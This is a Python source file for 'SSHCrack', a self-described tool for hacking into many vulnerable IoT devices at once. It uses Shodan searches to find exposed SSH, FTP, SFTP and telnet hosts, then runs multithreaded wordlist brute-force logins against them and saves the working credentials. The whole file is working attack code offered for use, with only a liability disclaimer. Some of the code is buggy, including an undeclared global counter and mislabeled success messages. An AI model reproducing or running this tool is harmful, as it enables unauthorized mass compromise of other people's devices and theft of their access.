# Made in Python 3.9.6
# SSHCrack v1.4
# Created by BredSec
# GitHub: https://github.com/BredSec
# This script is designed to help automate the process of hacking into multiple vulnerable SSH IoT devices simultaneously


import shodan
import threading
import os
import paramiko
import sys
import getopt
import ftplib
import pysftp
import telnetlib

global api

global ips
ips = []

global donenum
donenum = 0

def main(argv):
    apikey = "testing"
    target = ""
    iplist = ""
    userlist = "wordlists\\usernames.txt"
    passlist = "wordlists\\passwordlist.txt"
    users = []
    passwords = []
    attackmethod = "ssh"
    output = "output\\output.txt"
    multi = 1
    xmode = False
    verbose = False

    try:
        opts, args = getopt.getopt(argv, "hk:t:i:u:p:a:o:m:xv", ["help", "key=" "target=", "iplist=", "userlist=", "passlist=", "attack=", "output=", "multi=", "verbose"])
    except getopt.GetoptError:
        print("\033[0;32m   _____ _____ _    _  _____ _____            _____ _  __")
        print("\033[0;32m  / ____/ ____| |  | |/ ____|  __ \     /\   / ____| |/ /")
        print("\033[0;32m | (___| (___ | |__| | |    | |__) |   /  \ | |    | ' / ")
        print("\033[0;32m  \___ \___ \ |  __  | |    |  _  /   / /\ \| |    |  <  ")
        print("\033[0;32m  ____) |___) | |  | | |____| | \ \  / ____ \ |____| . \ ")
        print("\033[0;32m |_____/_____/|_|  |_|\_____|_|  \_\/_/    \_\_____|_|\_\  v1.4\n")
        print("\033[0;32m              Created by @BredSec")
        print("\n")
        print("\033[0;31m       Disclaimer: Developers not liable or responsible")
        print("\033[0;31m       for misuse or damage caused by SSHCrack")
        print("\n")
        print("\033[0musage: python sshcrack.py [-k --key <api key>] [-t --target <target name>] [-i --iplist <ip list>] \n[-u --userlist <username list>] [-p --passlist <password list>] [-a --attack <attack method>]\n[-o --output <output file name>] [-m --multi <thread number>] [-x] [-v --verbose]")
        print("\n")
        print("-h --help                     | Display help menu of arguments and command use")
        print("\n")
        print("-k --key <api key>            | Enter your Shodan API key here to enable Shodan searches")
        print("-t --target <target>          | Used to conduct an ssh search with shodan on a specified target")
        print("-i --iplist <ip list>         | Specify a file with a list of IPs to enumerate through and crack")
        print("-u --userlist <username list> | Specify a wordlist of usernames to enermate through")
        print("                              (default will be common default ssh logins)")
        print("-p --passlist <password list> | Specify a wordlist of passwords to enumerate through")
        print("                              (default will be common default ssh logins)")
        print("-a --attack <attack method>   | Method of attack (ssh, ftp, sftp, telnet)")
        print("-o --output <filename>        | Specify the name of an output file for successful logins")
        print("-m --multi <thread number>    | Number of threads to be used during cracking (default is one)")
        print("-x                            | X mode - runs cracking on all searched IPs immediately")
        print("-v --verbose                  | Verbose mode - display everything going on")
        print("\n")
        sys.exit(2)

    for opt, arg in opts:
        if opt in ("-h", "--help"):
            print("\033[0;32m   _____ _____ _    _  _____ _____            _____ _  __")
            print("\033[0;32m  / ____/ ____| |  | |/ ____|  __ \     /\   / ____| |/ /")
            print("\033[0;32m | (___| (___ | |__| | |    | |__) |   /  \ | |    | ' / ")
            print("\033[0;32m  \___ \___ \ |  __  | |    |  _  /   / /\ \| |    |  <  ")
            print("\033[0;32m  ____) |___) | |  | | |____| | \ \  / ____ \ |____| . \ ")
            print("\033[0;32m |_____/_____/|_|  |_|\_____|_|  \_\/_/    \_\_____|_|\_\  v1.4\n")
            print("\033[0;32m              Created by @BredSec")
            print("")
            print("\033[0;31m       Disclaimer: Developers not liable or responsible")
            print("\033[0;31m       for misuse or damage caused by SSHCrack")
            print("\n")
            print("\033[0musage: python sshcrack.py [-k --key <api key>] [-t --target <target name>] [-i --iplist <ip list>] \n[-u --userlist <username list>] [-p --passlist <password list>] [-a --attack <attack method>]\n[-o --output <output file name>] [-m --multi <thread number>] [-x] [-v --verbose]")
            print("\n")
            print("-h --help                     | Display help menu of arguments and command use")
            print("\n")
            print("-k --key <api key>            | Enter your Shodan API key here to enable Shodan searches")
            print("-t --target <target>          | Used to conduct an ssh search with shodan on a specified target")
            print("-i --iplist <ip list>         | Specify a file with a list of IPs to enumerate through and crack")
            print("-u --userlist <username list> | Specify a wordlist of usernames to enermate through")
            print("                              (default will be common default ssh logins)")
            print("-p --passlist <password list> | Specify a wordlist of passwords to enumerate through")
            print("                              (default will be common default ssh logins)")
            print("-a --attack <attack method>   | Method of attack (ssh, ftp, sftp, telnet)")
            print("-o --output <filename>        | Specify the name of an output file for successful logins")
            print("-m --multi <thread number>    | Number of threads to be used during cracking (default is one)")
            print("-x                            | X mode - runs cracking on all searched IPs immediately")
            print("-v --verbose                  | Verbose mode - display everything going on")
            print("\n")
            sys.exit(0)
        elif opt in ("-k", "--key"):
            apikey = arg
            try:
                api = shodan.Shodan(apikey)
            except shodan.APIError as error:
                print("Error: {}".format(error))
        elif opt in ("-t", "--target"):
            target = arg
        elif opt in ("-i", "--iplist"):
            iplist = arg
        elif opt in ("-u", "--userlist"):
            userlist = arg
        elif opt in ("-p", "--passlist"):
            passlist = arg
        elif opt in ("-a", "--attack"):
            if arg.lower() in ["ssh", "ftp", "sftp", "telnet"]:
                attackmethod = arg
                print("Attack method " + arg + " chosen")
            else:
                print("Error: Invalid attack method")
                sys.exit(2)
        elif opt in ("-o", "--output"):
            output = arg
        elif opt in ("-m", "--multi"):
            try:
                multi = int(arg)
            except OSError as error:
                print("Error: {}".format(error))
        elif opt in ("-x"):
            xmode = True
        elif opt in ("-v", "--verbose"):
            verbose = True

    if iplist != "":
        try:
            with open(iplist) as f:
                words = f.readlines()
                for word in words:
                   word = word.replace("\n", "")
                   ips.append(word)
        except OSError as error:
            print("Error: {}".format(error))
            sys.exit(2)

    try:
        with open(userlist) as f:
            words = f.readlines()
            for word in words:
               word = word.replace("\n", "")
               users.append(word)
    except OSError as error:
        print("Error: {}".format(error))
        sys.exit(2)

    try:
        with open(passlist) as f:
            words = f.readlines()
            for word in words:
               word = word.replace("\n", "")
               passwords.append(word)
    except OSError as error:
        print("Error: {}".format(error))
        sys.exit(2)

    if target != "":
        if apikey == "":
            print("Must specify a Shodan API key")
            sys.exit(2)
        else:
            search(attackmethod, target, xmode)
    elif target == "" and iplist == "":
        print("Must specify a target to search for or an IP address list")
        sys.exit(2)

    print("IPs to be cracked: " + str(len(ips)))

    if multi > 1:
        MultiThreading(multi, users, passwords, attackmethod, output, verbose)
    else:
        if attackmethod == "ftp":
            FTPConnect(multi, users, passwords, output, verbose)
        elif attackmethod == "sftp":
            SFTPConnect(multi, users, passwords, output, verbose)
        elif attackmethod == "telnet":
            TelnetConnect(multi, users, passwords, output, verbose)
        else:
            SSHConnect(multi, users, passwords, output, verbose)

def search(attackmethod, target, xmode):
    print("Searching for " + target + " targets...")
    ipaddr = []
    try:
        results = api.search(target)

        print("Results found: {}".format(results["total"]))
        for result in results["matches"]:
            if attackmethod == "ssh" and result["port"] == 22:
                ipaddr.append(result["ip_str"])
                if xmode == True:
                    ips.append (result["ip_str"])
            elif attackmethod == "ftp" and result["port"] in [20, 21]:
                ipaddr.append(result["ip_str"])
                if xmode == True:
                    ips.append (result["ip_str"])
            elif attackmethod == "sftp" and result["port"] == 22:
                ipaddr.append(result["ip_str"])
                if xmode == True:
                    ips.append (result["ip_str"])
            elif attackmethod == "telnet" and result["port"] == 23:
                ipaddr.append(result["ip_str"])
                if xmode == True:
                    ips.append (result["ip_str"])
            else:
                continue
        with open("output\IP_Addresses.txt", "w") as f:
            f.write("\n".join(ipaddr))

    except shodan.APIError as error:
        print("Error: {}".format(error))
        sys.exit(2)

def MultiThreading(multiNum, userList, passList, attackmethod, output, verbose):
    try:
        x = list(divide_list(userList, multiNum))
        y = list(divide_list(passList, multiNum))
        for i in range(multiNum):
            if verbose:
                print("Creating thread " + str(i))
            if attackmethod == "ftp":
                threading.Thread(target=FTPConnect, args=(multiNum, x[i], y[i], output, verbose)).start()
            else:
                threading.Thread(target=SSHConnect, args=(multiNum, x[i], y[i], output, verbose)).start()
    except OSError as error:
        print("Error: {}".format(error))

def SSHConnect(multiNum, userList, passList, output, verbose):
    client = paramiko.SSHClient()
    client.load_system_host_keys()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    out = open(output, "w")

    for ip in ips:
        breakout = False
        for user in userList:
            for password in passList:
                if verbose:
                    print("Trying IP: " + ip + " Username: " + user + " Password: " + password)
                try:
                    client.connect(ip, user, password)
                    
                    print("SUCESS <SSH>: " + user + "@" + user + " " + password)
                    out.write("SSH>> " + ip + "@" + user + " " + password)
                    out.write("\n")

                    client.close()
                    breakout = True
                    break
                except:
                    continue
            if breakout:
                break

    print("\nThread cracking completed")
    done_counter(multiNum)
    sys.exit(0)

def FTPConnect(multiNum, userList, passList, output, verbose):
    out = open(output, "w")

    for ip in ips:
        breakout = False
        for user in userList:
            for password in passList:
                if verbose:
                    print("Trying IP: " + ip + " Username: " + user + " Password: " + password)
                try:
                    ftp = ftplib.FTP()
                    ftp.connect(ip, 21)
                    ftp.login(user, password)

                    print("SUCESS <FTP>: " + user + "@" + user + " " + password)
                    out.write("FTP>> " + ip + "@" + user + " " + password)
                    out.write("\n")

                    ftp.quit()
                    breakout = True
                    break
                except:
                    continue
            if breakout:
                break
    
    print("\nThread cracking completed")
    done_counter(multiNum)
    sys.exit(0)

def SFTPConnect(multiNum, userList, passList, output, verbose):
    out = open(output, "w")

    for ip in ips:
        breakout = False
        for user in userList:
            for password in passList:
                if verbose:
                    print("Trying IP: " + ip + " Username: " + user + " Password: " + password)
                try:
                    sftp = pysftp.Connection(ip, username=user, password=password)

                    print("SUCESS <FTP>: " + user + "@" + user + " " + password)
                    out.write("FTP>> " + ip + "@" + user + " " + password)
                    out.write("\n")

                    sftp.close()
                    breakout = True
                    break
                except:
                    continue
            if breakout:
                break
    
    print("\nThread cracking completed")
    done_counter(multiNum)
    sys.exit(0)

def TelnetConnect(multiNum, userList, passList, output, verbose):
    out = open(output, "w")

    for ip in ips:
        breakout = False
        for user in userList:
            for password in passList:
                if verbose:
                    print("Trying IP: " + ip + " Username: " + user + " Password: " + password)
                try:
                    tn = telnetlib.Telnet()
                    tn.open(ip)
                    tn.read_until(b"login: ")
                    tn.write(user.encode("ascii")+b"\n")
                    tn.read_until(b"Password: ")
                    tn.write(password.encode("ascii")+b"\n")
                    tn.write(b"exit\n")

                    print("SUCESS <FTP>: " + user + "@" + user + " " + password)
                    out.write("FTP>> " + ip + "@" + user + " " + password)
                    out.write("\n")

                    tn.close()
                    breakout = True
                    break
                except:
                    continue
            if breakout:
                break
    
    print("\nThread cracking completed")
    done_counter(multiNum)
    sys.exit(0)

def divide_list(list, num):
    k, m = divmod(len(list), num)
    return (list[i*k+min(i, m):(i+1)*k+min(i+1, m)] for i in range(num))

def done_counter(multiNum):
    donenum += 1
    if donenum >= multiNum:
        try:
            print("\n(-) All Cracking Done (-)")
            sys.exit(0)
        except Exception:
            print(Exception)
            sys.exit(2)

if __name__ == "__main__":
    main(sys.argv[1:])